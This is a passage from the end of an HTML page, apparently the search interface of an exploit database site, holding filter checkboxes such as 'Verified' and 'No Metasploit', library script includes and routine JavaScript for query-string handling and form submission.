                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
